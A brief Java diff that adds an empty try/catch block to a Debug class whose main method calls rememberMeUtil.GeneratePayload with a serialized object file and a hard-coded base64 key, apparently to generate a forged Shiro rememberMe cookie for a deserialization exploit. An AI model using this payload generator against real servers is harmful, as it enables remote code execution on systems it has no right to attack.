@@ -14,5 +14,10 @@ import java.util.PriorityQueue;
 public class Debug {
     public static void main(String[] args) throws Exception {
         System.out.println(rememberMeUtil.GeneratePayload("/Users/0x22cb7139/Desktop/k.ser","kPH+bIxk5D2deZiIxcaaaA=="));
+        try{
+
+        }catch (Exception e){
+            e.printStackTrace();
+        }
     }
 }
